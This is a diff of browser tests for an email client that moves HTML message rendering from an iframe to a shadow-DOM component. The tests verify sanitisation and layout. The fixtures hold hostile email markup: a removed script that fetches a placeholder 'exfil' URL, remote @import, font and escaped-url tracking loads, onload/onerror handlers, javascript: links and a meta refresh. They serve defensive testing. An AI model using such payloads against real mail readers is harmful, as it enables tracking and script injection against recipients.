@@ -7,7 +7,7 @@ import { MailBrowser } from '../frontend/src/features/mail/MailView';
 import { mailHtmlDocument, mailLink } from '../frontend/src/features/mail/mailHtmlDocument';
 import { mailEditableDocument } from '../frontend/src/features/mail/mailEditableDocument';
 import { mailReplyDocument, serializeReplyDocument } from '../frontend/src/features/mail/mailReplyDocument';
-import { applyMailReadBodyPadding } from '../frontend/src/features/mail/mailReadBodyPadding';
+import { MailHtmlBody } from '../frontend/src/features/mail/MailHtmlBody';
 import { mailApiFixture, mailMessageFixture, mailSuccess } from './apple-mail-fixtures';
 
 const image = { contentId: 'logo@test', mimeType: 'image/png', base64: 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+a2ioAAAAASUVORK5CYII=' };
@@ -37,6 +37,8 @@ const api = mailApiFixture({
 const root = createRoot(document.getElementById('root')!);
 const pause = () => new Promise(resolve => setTimeout(resolve, 150));
 const frame = () => document.querySelector('iframe')!;
+const reader = () => document.querySelector<HTMLElement>('[aria-label="HTML message content"]')!;
+const readTree = () => reader()?.shadowRoot!;
 const button = () => [...document.querySelectorAll<HTMLButtonElement>('#root button')].find(button => button.textContent === 'Load images');
 async function waitFor(check: () => boolean) {
   for (let i = 0; i < 200; i++) {
@@ -48,21 +50,21 @@ async function waitFor(check: () => boolean) {
 async function selectMessage(index: number) {
   const row = document.querySelectorAll<HTMLButtonElement>('[aria-label="Message list"] button[aria-pressed]')[index]!;
   flushSync(() => row.click());
-  await waitFor(() => frame()?.contentDocument?.querySelector('h1')?.textContent === 'Newsletter' && frame().contentDocument?.readyState === 'complete');
+  await waitFor(() => readTree()?.querySelector('h1')?.textContent === 'Newsletter');
   await pause();
 }
 function widths() {
-  const current = frame();
-  const doc = current.contentDocument!;
+  const current = reader();
+  const doc = readTree();
   const layout = doc.getElementById('layout')!;
   const parent = layout.parentElement!;
-  const style = current.contentWindow!.getComputedStyle(parent);
-  return { article: current.closest('article')!.clientWidth, frame: current.getBoundingClientRect().width,
+  const style = getComputedStyle(parent);
+  return { article: current.closest('article')!.clientWidth, host: current.getBoundingClientRect().width,
     layout: layout.getBoundingClientRect().width,
     available: parent.clientWidth - parseFloat(style.paddingLeft) - parseFloat(style.paddingRight),
     columns: doc.getElementById('columns')!.getBoundingClientRect().width,
     logo: doc.getElementById('logo')!.getBoundingClientRect().width,
-    overflow: doc.documentElement.scrollWidth > current.clientWidth };
+    overflow: doc.querySelector('html')!.scrollWidth > current.clientWidth };
 }
 
 async function prepare() {
@@ -79,31 +81,27 @@ async function prepare() {
     unsafeLinks: ['javascript:alert(1)', 'file:///secret', 'data:text/html,test', 'cheshi://open', 'https://user:pass@example.test'].map(mailLink),
     remote: clean.hasRemoteImages,
   };
-  flushSync(() => root.render(<MailBrowser api={api} rightSidebarOpen={false} onToggleRightSidebar={() => {}} />));
+  flushSync(() => root.render(<MailBrowser api={api} />));
   await waitFor(() => document.querySelectorAll('[aria-label="Message list"] button[aria-pressed]').length === 2);
   await selectMessage(0);
-  const live = frame().contentDocument!;
+  const live = readTree();
   const display = {
     title: live.querySelector('h1')?.textContent,
-    font: frame().contentWindow!.getComputedStyle(live.querySelector('h1')!).fontSize,
-    background: frame().contentWindow!.getComputedStyle(live.body).backgroundColor,
+    font: getComputedStyle(live.querySelector('h1')!).fontSize,
+    background: getComputedStyle(live.querySelector('body')!).backgroundColor,
     loadedImage: (live.querySelector('#logo') as HTMLImageElement).naturalWidth,
-    sandbox: frame().getAttribute('sandbox'),
+    iframes: document.querySelectorAll('iframe').length,
     button: button()?.textContent,
     hostFont: getComputedStyle(document.getElementById('host-title')!).fontSize,
   };
-  // Exercise CSP/sandbox even if a future sanitizer accidentally leaves active markup.
-  frame().srcdoc = clean.srcDoc.replace('</body>', `<script>parent.compromised=true;fetch('https://mail-fixture.invalid/exfil')</script>
-    <img src="https://mail-fixture.invalid/blocked" onerror="parent.compromised=true"></body>`);
-  await pause();
   return { formatting, display, compromised: Object.hasOwn(window, 'compromised') };
 }
 
 async function allowImages() {
   flushSync(() => button()!.click());
-  await waitFor(() => (frame()?.contentDocument?.querySelector('img[src^="https:"]') as HTMLImageElement | null)?.naturalWidth === 1);
+  await waitFor(() => (readTree()?.querySelector('img[src^="https:"]') as HTMLImageElement | null)?.naturalWidth === 1);
   await pause();
-  const doc = frame().contentDocument!;
+  const doc = readTree();
   const href = doc.querySelector('a[href]')!;
   // Parent listener routes validated links to the normal external browser handler.
   href.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));
@@ -113,16 +111,16 @@ async function allowImages() {
 
 async function switchMessage() {
   await selectMessage(1);
-  const result = { button: button()?.textContent, remoteSources: frame().contentDocument!.querySelectorAll('img[src^="https:"]').length };
+  const result = { button: button()?.textContent, remoteSources: readTree().querySelectorAll('img[src^="https:"]').length };
   return result;
 }
 
 async function reselectMessage() {
   await selectMessage(0);
-  await waitFor(() => (frame()?.contentDocument?.querySelector('img[src^="https:"]') as HTMLImageElement | null)?.naturalWidth === 1);
-  const first = { button: button()?.textContent ?? null, naturalWidth: (frame().contentDocument!.querySelector('img[src^="https:"]') as HTMLImageElement).naturalWidth };
+  await waitFor(() => (readTree()?.querySelector('img[src^="https:"]') as HTMLImageElement | null)?.naturalWidth === 1);
+  const first = { button: button()?.textContent ?? null, naturalWidth: (readTree().querySelector('img[src^="https:"]') as HTMLImageElement).naturalWidth };
   await selectMessage(0);
-  const repeated = { button: button()?.textContent ?? null, remoteSources: frame().contentDocument!.querySelectorAll('img[src^="https:"]').length };
+  const repeated = { button: button()?.textContent ?? null, remoteSources: readTree().querySelectorAll('img[src^="https:"]').length };
   document.getElementById('root')!.style.width = '700px';
   await pause();
   const narrow = widths();
@@ -278,41 +276,145 @@ async function fontSizes() {
 }
 
 async function readBodyPadding() {
-  const preview = document.createElement('iframe');
-  preview.style.cssText = 'position:absolute;left:-10000px;width:550px;height:600px;visibility:hidden;border:0';
-  preview.setAttribute('sandbox', 'allow-same-origin');
+  const preview = document.createElement('div');
+  preview.style.cssText = 'position:absolute;left:-10000px;width:550px;visibility:hidden';
   document.body.append(preview);
+  const fixture = createRoot(preview);
   const results = [];
+  const reply = '<p id="reply" style="font-size:18px;color:#c02030">Reply text</p>';
+  const quote = '<blockquote type="cite" style="margin:16px 0 0;padding-left:12px;font-size:12px;color:#123456">'
+    + '<p id="quote">Original</p><blockquote type="cite" style="margin:inherit;padding:inherit"><p id="nested">Earlier reply</p></blockquote></blockquote>';
   try {
-    for (const nested of [false, true]) {
+    for (const source of [reply + quote, `<div><div>${reply}${quote}</div></div>`, quote, reply]) {
       for (const width of [550, 320]) {
         preview.style.width = `${width}px`;
-        const reply = '<p id="reply" style="font-size:18px;color:#c02030">Reply text</p>';
-        const quote = '<blockquote type="cite" style="margin:16px 0 0;padding-left:12px;font-size:12px">'
-          + '<p id="quote">Original</p><blockquote type="cite" style="margin:inherit;padding:inherit"><p id="nested">Earlier reply</p></blockquote></blockquote>';
-        const source = nested ? `<div><div>${reply}${quote}</div></div>` : reply + quote;
-        await new Promise<void>(resolve => {
-          preview.onload = () => resolve();
-          preview.srcdoc = mailHtmlDocument(source, [], false, window).srcDoc;
-        });
-        const doc = preview.contentDocument!;
-        const view = preview.contentWindow!;
+        const srcDoc = mailHtmlDocument(source, [], false, window).srcDoc;
+        flushSync(() => fixture.render(<MailHtmlBody srcDoc={srcDoc} />));
+        const host = preview.querySelector<HTMLElement>('[aria-label="HTML message content"]')!;
+        const tree = host.shadowRoot!;
+        const container = host.parentElement!;
         const sample = (id: string) => {
-          const element = doc.getElementById(id)!;
+          const element = tree.getElementById(id);
+          if (!element) return null;
           const box = element.getBoundingClientRect();
-          const style = view.getComputedStyle(element);
+          const style = getComputedStyle(element);
           return { left: box.left, width: box.width, font: style.fontSize, color: style.color };
         };
+        container.style.paddingInline = '0';
         const before = { reply: sample('reply'), quote: sample('quote'), nested: sample('nested') };
-        const quoteHtml = doc.querySelector('blockquote')!.outerHTML;
-        applyMailReadBodyPadding(doc.body);
+        const quoteHtml = tree.querySelector('blockquote')?.outerHTML;
+        container.style.removeProperty('padding-inline');
         const after = { reply: sample('reply'), quote: sample('quote'), nested: sample('nested') };
-        results.push({ nested, width, before, after, quoteUnchanged: quoteHtml === doc.querySelector('blockquote')!.outerHTML,
-          overflow: doc.documentElement.scrollWidth > doc.documentElement.clientWidth });
+        const draft = mailReplyDocument({ ...message, html: source }, window);
+        const outgoing = serializeReplyDocument(new DOMParser().parseFromString(draft, 'text/html'));
+        results.push({ width, before, after,
+          quoteUnchanged: quoteHtml === tree.querySelector('blockquote')?.outerHTML,
+          padding: [getComputedStyle(container).paddingLeft, getComputedStyle(container).paddingRight],
+          outgoingClean: !/--text|--cheshi-mail-read|cheshi-mail-body|data-cheshi-mail-read-padding/.test(outgoing),
+          overflow: tree.querySelector('html')!.scrollWidth > host.clientWidth });
       }
     }
     return results;
-  } finally { preview.remove(); }
+  } finally { flushSync(() => fixture.unmount()); preview.remove(); }
 }
 
-Object.assign(window, { mailChecks: { prepare, allowImages, switchMessage, reselectMessage, prepareReply, finishReply, colorDefaults, fontSizes, readBodyPadding } });
+async function readBackgrounds() {
+  const preview = document.createElement('div');
+  preview.style.cssText = 'position:absolute;left:-10000px;width:550px;height:600px;border:0';
+  document.body.append(preview);
+  const fixture = createRoot(preview);
+  const results = [];
+  const panel = '<center><table id="envelope" bgcolor="#f0f0f0"><tr><td></td><td>'
+    + '<table id="content" bgcolor="#ffffff"><tr><td><p>Content</p><div id="nested" style="background:#f0f0f0"><p>Authored panel</p></div></td></tr></table>'
+    + '</td><td></td></tr></table></center><table id="footer" bgcolor="#f0f0f0"><tr><td>Footer</td></tr></table>';
+  try {
+    for (const [name, source] of [
+      ['legacy', `<body bgcolor="#f0f0f0">${panel}</body>`],
+      ['stylesheet', `<style>body{background:#f0f0f0!important}</style>${panel}`],
+      ['root', `<html style="background:#f0f0f0"><body>${panel}</body></html>`],
+      ['single', '<body style="background:#123456;color:white"><p>Single content surface</p></body>'],
+      ['white', '<body style="background:white"><p>Authored white background</p></body>'],
+      ['transparent', '<body style="background:transparent"><p>Authored transparent background</p></body>'],
+      ['default', '<p>No authored background</p>'],
+      ['authored-text', '<html style="color:#345678"><body><p>Authored text color</p></body></html>'],
+    ]) {
+      flushSync(() => fixture.render(<MailHtmlBody srcDoc={mailHtmlDocument(source!, [], false, window).srcDoc} />));
+      const tree = preview.querySelector('[aria-label="HTML message content"]')!.shadowRoot!;
+      const colors = [tree.querySelector('html'), tree.querySelector('body'), ...['envelope', 'content', 'nested', 'footer'].map(id => tree.getElementById(id))]
+        .map(element => element ? getComputedStyle(element).backgroundColor : null);
+      const textColor = getComputedStyle(tree.querySelector('p')!).color;
+      preview.style.setProperty('--text', '#abcdef');
+      const themedColor = getComputedStyle(tree.querySelector('p')!).color;
+      preview.style.removeProperty('--text');
+      results.push({ name, colors, textColor, themedColor });
+    }
+    return results;
+  } finally { flushSync(() => fixture.unmount()); preview.remove(); }
+}
+
+
+async function shadowReading() {
+  const container = document.createElement('div');
+  container.style.cssText = 'width:400px;height:200px;overflow:auto';
+  document.body.append(container);
+  const fixture = createRoot(container);
+  const appBackground = document.documentElement.style.backgroundColor;
+  const appFont = getComputedStyle(document.getElementById('host-title')!).fontSize;
+  const source = String.raw`<html><head><style>
+    @import url(https://mail-fixture.invalid/shadow-import);
+    @font-face{font-family:leak;src:url(https://mail-fixture.invalid/shadow-font)}
+    :host{position:fixed;width:9000px!important;background:red!important}
+    :host-context(body){display:none!important}
+    ::slotted(*){color:red!important}
+    :root{background:#f0f0f0}body{color:#123456;font-family:Arial;font-size:12px}
+    #long{height:24px!important;max-height:24px!important;overflow:auto!important}
+    .escape{background-image:u\72l(https://mail-fixture.invalid/shadow-escaped)}
+    .image-set{background-image:image-set("https://mail-fixture.invalid/shadow-set" 1x)}
+    @media(min-width:1px){.emphasis{font-size:18px;color:rgb(200,30,40)}}
+    .variables{--resource:url(https://mail-fixture.invalid/shadow-var);background:var(--resource)}
+  </style><meta http-equiv="refresh" content="0;url=https://mail-fixture.invalid/redirect"></head>
+  <body onload="window.compromised=true" background="https://mail-fixture.invalid/shadow-background">
+  <div style="background:white"><p class="emphasis">Preserved format</p>
+  <div id="long" style="height:24px;overflow:scroll;position:fixed;inset:0">
+  ${Array.from({ length: 40 }, (_, index) => `<p>Line ${index}</p>`).join('')}
+  <blockquote type="cite" style="margin-bottom:48px"><p id="last">Final quoted line</p></blockquote></div>
+  <p class="escape image-set variables">Passive content</p>
+  <img src="https://mail-fixture.invalid/shadow-img" onerror="window.compromised=true">
+  <a href="javascript:window.compromised=true">Unsafe link</a>
+  <script>window.compromised=true</script><iframe src="https://mail-fixture.invalid/shadow-frame"></iframe>
+  <form><input autofocus><button>Submit</button></form><slot></slot>
+  </div></body></html>`;
+  try {
+    flushSync(() => fixture.render(<MailHtmlBody srcDoc={source} />));
+    await pause();
+    const host = container.querySelector<HTMLElement>('[aria-label="HTML message content"]')!;
+    const tree = host.shadowRoot!;
+    const before = host.getBoundingClientRect().height;
+    const image = document.createElement('img');
+    image.style.width = '320px';
+    image.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+a2ioAAAAASUVORK5CYII=';
+    const loaded = new Promise<void>(resolve => { image.onload = () => resolve(); });
+    tree.querySelector('body')!.append(image);
+    await loaded;
+    await pause();
+    const after = host.getBoundingClientRect().height;
+    return {
+      iframes: container.querySelectorAll('iframe').length + tree.querySelectorAll('iframe').length,
+      active: tree.querySelectorAll('script,form,input,button,slot,meta,link,[onload],[onerror],a[href^="javascript:"]').length,
+      compromised: Object.hasOwn(window, 'compromised'),
+      hostStable: appBackground === document.documentElement.style.backgroundColor
+        && appFont === getComputedStyle(document.getElementById('host-title')!).fontSize,
+      hostWidth: host.getBoundingClientRect().width,
+      naturalHeight: before > 500 && after >= before + 319,
+      outerScroll: container.scrollHeight > container.clientHeight,
+      innerScroll: [...tree.querySelectorAll<HTMLElement>('html,body,#long')].some(element =>
+        ['auto', 'scroll'].includes(getComputedStyle(element).overflowY) || element.scrollHeight > element.clientHeight + 1),
+      font: getComputedStyle(tree.querySelector('.emphasis')!).fontSize,
+      color: getComputedStyle(tree.querySelector('.emphasis')!).color,
+      lastLineVisible: tree.querySelector('#last')!.getBoundingClientRect().bottom <= host.getBoundingClientRect().bottom,
+      leakedRules: [...tree.querySelectorAll('html style')].some(style => /:host|::slotted|@font-face|@import|image-set|var\(/i.test(style.textContent ?? '')),
+    };
+  } finally { flushSync(() => fixture.unmount()); container.remove(); }
+}
+
+Object.assign(window, { mailChecks: { prepare, allowImages, switchMessage, reselectMessage, prepareReply, finishReply, colorDefaults, fontSizes, readBodyPadding, readBackgrounds, shadowReading } });
